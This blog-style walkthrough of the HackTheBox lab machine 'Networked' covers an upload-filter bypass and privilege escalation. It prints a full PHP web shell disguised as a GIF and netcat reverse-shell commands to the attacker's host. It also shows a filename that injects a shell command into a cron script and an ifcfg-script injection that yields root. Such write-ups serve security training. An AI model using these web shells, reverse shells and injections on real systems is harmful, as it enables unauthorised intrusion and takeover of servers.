---
layout: post
title: Hackthebox Networkd Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-11-18/networkd-badge.png)
# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Networkd".<br>

# Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.146 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-16 11:51 EET
Nmap scan report for 10.10.10.146
Host is up (0.043s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.45 seconds
{% endhighlight %}

Gobuster HTTP port 80:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.146/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2019/11/16 11:55:17 Starting gobuster
===============================================================
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)
===============================================================
2019/11/16 12:44:09 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

We have almost only one port 80 to enumerate at a glancce.<br>
In the path "/upload.php", we can find a function to upload an image file.
![placeholder](https://inar1.github.io/public/images/2019-11-18/2019-11-17-14-23-16.png)

In the path "/backup", we can find a backup file.
![placeholder](https://inar1.github.io/public/images/2019-11-18/2019-11-17-13-59-24.png)

Then, extract the files from the tar file.<br>
We have following 4 files there.
{% highlight shell %}
root@kali:~# tar -xvf backup.tar 
index.php
lib.php
photos.php
upload.php
{% endhighlight %}

Sounds "upload.php" is to upload a file. The function for that is defined in "lib.php"<br>
upload.php:
{% highlight php %}
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
{% endhighlight %}

lib.php:
{% highlight shell %}

---

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

---

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }
}

---

function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}

---

{% endhighlight %}

In summerize, what "upload.php" is doing the followings.
1. Check if the uploaded file is valid with "check_file_type()".
2. "check_file_type()" checks the magic bytes of the file with "check_mime_type()".
3. Check the extension of the uploaded file
4. If these are OK, create a name of uploaded file with "getnameUploaded()"
5. Finally, move the uploaded file from the temporary directory to "/uploads"

This means, by using double extention method, with adding appropriate magic bytes, we can bypass the filter.
{% highlight shell %}
root@kali:~# cat simple-backdoor.php.gif
GIF89a
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
{% endhighlight %}

Then, upload the double extensioned file.<br>
We can see a message which says file is uploaded successfully.
![placeholder](https://inar1.github.io/public/images/2019-11-18/2019-11-17-14-49-32.png)

The uploaded file is in the path "/uploads".<br>
According to "photos.php", the name of uploaded file is "10_10_14_13.php.gif"
![placeholder](https://inar1.github.io/public/images/2019-11-18/2019-11-17-14-56-38.png)

We can access to the webshell uploaded just like following.
{% highlight shell %}
root@kali:~# curl http://10.10.10.146/uploads/10_10_14_13.php.gif
GIF89a
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->


Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
{% endhighlight %}

By adding a GET parameter "cmd", we can execute arbitrary command.
{% highlight shell %}
root@kali:~# curl "http://10.10.10.146/uploads/10_10_14_13.php.gif?cmd=uname%20-a"
GIF89a
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
</pre>
{% endhighlight %}

As this box is ranked "easy", we have a netcat command which has an option "-c".<br>
Meaning we can achieve a reverse shell by using netcat.
{% highlight shell %}
root@kali:~# curl "http://10.10.10.146/uploads/10_10_14_13.php.gif?cmd=which%20nc"
GIF89a
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>/usr/bin/nc
</pre>
{% endhighlight %}

After the launch of the netcat listener on port 4444, execute the following command.
{% highlight shell %}
root@kali:~# curl "http://10.10.10.146/uploads/10_10_14_13.php.gif?cmd=nc%2010.10.14.13%204444%20-c%20/bin/bash"
{% endhighlight %}

Next, access to the netcat listener.<br>
We can get a shell of remote access as user "apache".
{% highlight shell %}
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.146] 53134
id
uid=48(apache) gid=48(apache) groups=48(apache)
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$
{% endhighlight %}

However, we are still not able to read the user.txt in the directory "/home/guly".<br>
But we can find some files interesting.
{% highlight shell %}
bash-4.2$ ls -l       
ls -l
total 12
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
{% endhighlight %}
{% highlight shell %}
bash-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
{% endhighlight %}
{% highlight shell %}
bash-4.2$ cat check_attack.php
cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
{% endhighlight %}

The important line is following.<br>
Since $value is name of a file in the directory "/var/www/html/uploads/", by creating a file, we can inject this variable.
{% highlight shell %}
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
{% endhighlight %}

This time, launch a netcat listener and create the following file.<br>
We can achieve a reverse shell as a user guly.
{% highlight shell %}
bash-4.2$ touch ';nc 10.10.14.13 4443 -c bash'
touch ';nc 10.10.14.13 4443 -c bash'
{% endhighlight %}
{% highlight shell %}
root@kali:~# nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.146] 49000
python -c 'import pty;pty.spawn("/bin/bash")'
[guly@networked ~]$ id            
id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
[guly@networked ~]$
{% endhighlight %}

user.txt is in the home directory of user "guly".
{% highlight shell %}
[guly@networked ~]$ cat user.txt
cat user.txt
526cfc2305f17faaacecf212c57d71c5
[guly@networked ~]$ 
{% endhighlight %}

### 3. Getting Root

As always, check if we can do something as a root.<br>
We can execute "/usr/local/sbin/changename.sh" as root with no password.
{% highlight shell %}
[guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$
{% endhighlight %}

"changename.sh" is a bash script which tries to rewrite the content of "/etc/sysconfig/network-scripts/ifconfig-guly" each time it is executed.
{% highlight shell %}
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
[guly@networked ~]$ 
{% endhighlight %}

Execution of changename.sh:
1. take user input as "$x"
2. write each config "NAME", "PROXY_METHOD", "BROWSER_ONLY", "BOOTPROTO" in "ifconfig-guly"
{% highlight shell %}
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
test
test
interface PROXY_METHOD:
test
test
interface BROWSER_ONLY:
test
test
interface BOOTPROTO:
test
test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
[guly@networked ~]$ 
{% endhighlight %}

Command output:
{% highlight shell %}
[guly@networked ~]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
cat /etc/sysconfig/network-scripts/ifcfg-guly
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=test
PROXY_METHOD=test
BROWSER_ONLY=test
BOOTPROTO=test
[guly@networked ~]$ 
{% endhighlight %}

To find a way to pwn this script, we can google like following.<br>
We can find a <a href="https://seclists.org/fulldisclosure/2019/Apr/24">discussion of seclist.org</a> about getting root through network-scripts.
{% highlight shell %}
linux ifcfg script code execution full disclosure
{% endhighlight %}

According to this discussion, Redhat/CentOS has a vulnerability that if we have write permission for ifcf script in "/etc/sysconfig/network-scripts", we can achieve a root privilege of the host.<br>
So try to put some spaces in the input. we can find interesting lines.
{% highlight shell %}
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: y: command not found
{% endhighlight %}
{% highlight shell %}
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
x y
x y
interface PROXY_METHOD:
x y
x y
interface BROWSER_ONLY:
x y
x y
interface BOOTPROTO:
x y
x y
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: y: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 5: y: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 6: y: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 7: y: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: y: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 5: y: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 6: y: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 7: y: command not found
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
[guly@networked ~]$ 
{% endhighlight %}

Then, try to inject the script by having "bash" as a 2nd argument of input.<br>
We can achieve a root shell.
{% highlight shell %}
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
x bash
x bash
interface PROXY_METHOD:
x y
x y
interface BROWSER_ONLY:
x y
x y
interface BOOTPROTO:
x y
x y

[root@networked network-scripts]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@networked network-scripts]# 
{% endhighlight %}

As always, root.txt is in the directory "/root".
{% highlight shell %}
[root@networked network-scripts]# cat /root/root.txt
cat /root/root.txt
0a8ecda83f1d81251099e8ac3d0dcb82
[root@networked network-scripts]#
{% endhighlight %}
